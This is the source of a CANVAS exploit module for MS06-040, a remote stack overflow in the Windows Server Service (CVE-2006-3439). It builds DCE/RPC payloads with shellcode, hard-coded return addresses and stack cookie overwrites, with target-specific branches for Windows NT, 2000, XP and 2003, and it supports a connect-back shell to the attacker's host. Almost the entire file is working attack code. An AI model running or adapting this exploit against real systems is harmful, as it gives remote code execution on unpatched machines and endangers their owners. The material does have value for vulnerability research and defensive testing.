#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from MOSDEF import mosdef
from msrpcexploit import msrpcexploit 
from libs.dcemarshall import *
from libs.newsmb.libdcerpc import s_dce_raw_unistring, s_dce_win2k_unistring

# GUI info
NAME='Windows Server Service Overflow (MS06-040)'
DESCRIPTION='Windows Server Service CanonicalizePathName() Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='08/08/2006'
DOCUMENTATION['CVE Name'] = 'CVE-2006-3439'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3439'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['CVS URL'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3439'
DOCUMENTATION['CERT Advisory']='http://www.kb.cert.org/vuls/id/650769'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS06-040.mspx'
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['Note']='Due to the primitive on the stack, the XP/2003 might not be that reliable. In worst case, try running it twice'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']
PROPERTY['MSADV']='MS06-040'

CHANGELOG="""
"""

NOTES="""
"""

targets={
    0: ['Autoversioning',0],
    1: ['Windows NT 4.0 SP6a [NOT WORKING]',0x7ffdf24c],
    2: ['Windows 2000 SP0-SP4',0x7ffdf24c],
    3: ['Windows XP SP0-SP1a',0x7ffdf24c],
    4: ['Windows 2003 SP0 English',0x71c8c1ec],
}


class theexploit(msrpcexploit):

    def __init__(self):
        msrpcexploit.__init__(self)
        self.name                = NAME
        self.version             = 0
        self.badstring           = '\0\xff'
        self.searchbadstring     = '\0'
        self.UUID                = u'4b324fc8-1670-01d3-1278-5a47bf6ee188'
        self.uuidversion         = u'3.0'
        self.targetfunction      = 0x1f
        self.autoversion         = 1
        self.subesp              = 3000
        self.sleeptime           = 4
        self.namedpipe           = '\\browser'
        self.buildConnectionList = self.buildTCPConnectionList

    def testOS(self):
        if self.version!=0:
            self.log("TestOS running with version %d?!?"%self.version)
            
        self.version=0
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        if app.run()==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        os=app.result
        if os.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if os.version=='NT':
            self.version=1
            return 1
        elif os.version=='2000':
            self.version=2
            return 1
        elif os.version=='XP':
            self.log("Autohack state: %s"%self.argsDict.get("autohack_state"))
            if self.argsDict.get("autohack_state"):
                self.log("Not using ms06_040 against XP during autohack")
                return 0
            else:
                self.log("Using ms06_040 against XP machine - possible to crash service")
            self.version=3
            return 1

        elif os.version=='2003':
            if self.argsDict.get("autohack_state"):
                self.log("Not using ms06_040 against 2003 during autohack")
                return 0
            self.version=4
            return 1
        else:
            self.log('OS not vulnerable: %s'%(os))
        return 0
    
    def buildDcePacket(self):
        self.info,self.eip=targets[self.version]
        self.log('Attacking %s'%(self.info))

        data=''
        
        if self.version==1 or self.version==2: #Windows NT 4.0 SP6a and 2000 SP0-SP4
            payload=''
            payload+=self.shellcode
            payload+='A'*(0x416-len(payload))
            payload+=struct.pack('<L',self.eip+2)
            payload+='CCCCDDDD'
            payload+=struct.pack('<L',self.eip)
            payload+=struct.pack('<L',0xffffffff)
            data+=struct.pack('<L',0)
            data+=s_dce_raw_unistring(payload)
            data+=struct.pack('<L',1)
            data+=s_dce_win2k_unistring('/')
            data+=struct.pack('<LL',1,1)

        elif self.version==3: #Windows XP SP1a (slight difference between SP0 and SP1a)
            stager="""addl $0x70,%esp
movl 0x60(%esp),%eax
addl $0x10,%eax
call %eax"""
            padsize=0x20
            payload=''
            payload+='A'*padsize #the beginning of the buffer might get corrupted
            payload+=mosdef.assemble(stager,'x86')
            payload+='A'*(0x264-len(payload))
            payload+=struct.pack('<L',self.eip+padsize) #for SP0
            payload+='CCCCDDDD'
            payload+=struct.pack('<L',self.eip)
            payload+=struct.pack('<L',0xffffffff)
            payload+='E'*(0x294-len(payload))
            payload+=struct.pack('<L',self.eip+padsize) #for SP1a
            payload+='FFFFGGGG'
            payload+=struct.pack('<L',self.eip)
            payload+=struct.pack('<L',0xffffffff)
            data+=struct.pack('<L',0)
            data+=s_dce_raw_unistring(payload)
            data+=struct.pack('<L',1)
            data+=s_dce_win2k_unistring('')
            data+=struct.pack('<LL',1,1)
            resp = True if self.response else False
            ret=self.myDCE.call(self.targetfunction, data, response=resp)

            if (len(self.shellcode)%2)!=0:
                self.shellcode+='E'
            data+=struct.pack('<L',0)
            data+=s_dce_raw_unistring(self.shellcode)
            data+=struct.pack('<L',1)
            data+=s_dce_win2k_unistring('')
            data+=struct.pack('<LL',1,1)
            self.connect()

        elif self.version==4: #Windows 2003 SP0, I won't touch that yet
            marshaller=dcemarshaller()
            geteip=self.eip
            # First call: Find the disaligment of the unitialized rpc call
            # Basically, we send a string, and see how many garbage we have before our string

            self.log("1) Finding the correct aligment of the unitialized buffer") 

            buffer =  "ABCD"
            data   = self.doMarshall(marshaller, buffer)
            self.myDCE.call(self.targetfunction, data, response = True )
            ret = self.myDCE.reassembled_data
            first_offset = ret.find("ABCD")
            self.log("  - Aligment found : 0x%04x" % first_offset)
            
            # Second call: Now we know exactly the offset of the disaligment, so now we will try to
            #  know exaclty at what point the buffer gets written by a double "zero" on the overwrite func
            #  Two rpc calls need for that

            self.log("2) Finding the point where unitialized gets overwritten")

            self.connect()
            buffer = intel_order(geteip - first_offset) + "A" * 0x200
            data   = self.doMarshall(marshaller, buffer)
            self.myDCE.call(self.targetfunction, data, response=True)
            ret = self.myDCE.reassembled_data
            second_offset = 0
            self.connect()
            buffer = "B" * 0x10
            data   = self.doMarshall(marshaller, buffer)
            self.myDCE.call(self.targetfunction, data, response=True)
            ret = self.myDCE.reassembled_data

            if ret:
                second_offset = self.parseResponse(ret) # returns the offset
            
            self.log("  - Offset to the overwrite: 0x%04x" % second_offset) 

            # This guy, overwrites 
            ndx = 0x418 - second_offset
            if ndx < len(self.shellcode):
                self.log("Sorry, The shellcode is too big to Work (size: %d, available: %d)" % (len(self.shellcode), ndx))
                return ""
            buffer  = "A" * 0x8 + self.shellcode + "B" * ( ndx - 8 - len(self.shellcode) )
            buffer += intel_order(geteip - first_offset ) # stack cookie
            buffer += "CCCC"  # EBP
            buffer +=  intel_order(geteip + second_offset - first_offset) # ret address
            buffer +=  intel_order(geteip-first_offset) * 4 # arguments
            self.log("3) Stack layout: ")
            self.log("   [ 0x%08x] # DWORD that overwrite where the cookie is  " % (geteip - first_offset) ) 
            self.log("   [    ....   ] # nops + shellcode") 
            self.log("   [ 0x%08x] # stack cookie" % (geteip - first_offset) ) 
            self.log("   [ 0x%08x] # EBP " % 0x43434343  ) 
            self.log("   [ 0x%08x] # RET " % (geteip + second_offset - first_offset) ) 
            self.log("   [    ...    ] # " ) 
            self.log("   [ 0x%08x] # arg_8 which is passed to a memcpy, and copy this buffer into the cookie .data" % (geteip-first_offset) ) 
            data = self.doMarshall(marshaller, buffer)
            #try:
            #    ret = self.myDCE.call(self.targetfunction,data, response = 1)
            #except DCEException:
            #    print "Exception #3"

            self.connect()
        return data

    def doMarshall(self, marshaller, buffer):
        data=dcepointer(wchar_t(msunistring('Moo'),['unique'],marshaller),['unique'],marshaller).marshall()
        data+=wchar_t(buffer,['unique'],marshaller).marshall()
        data+=dceint(0xbeef,[],marshaller).marshall()
        data+=wchar_t(msunistring('' ),['unique'],marshaller).marshall()
        data+=dceint(0x41424344,[],marshaller).marshall() #TYPE
        data+=dceint(0,[],marshaller).marshall() #FLAGS
        return data
 
    def parseResponse(self,buf):
        ndx=buf.find('\x41\x41\x41\x41')
        #self.log('Found NDX 0x41414141: 0x%08x'%(ndx))
        ndx=buf.find('\x42\x42\x42\x42')
        return ndx

    def usage(self):
        print 'Usage: %s -v version -t host -l localIP -d localPort (connectback) [ -p port -T (toggle test mode) ]'% sys.argv[0]
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d : %s'% (i,listline[0])
            i=i+1
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
    elif ret not in [0,1,None]:
        print 'Weird return value: %s'%(ret)
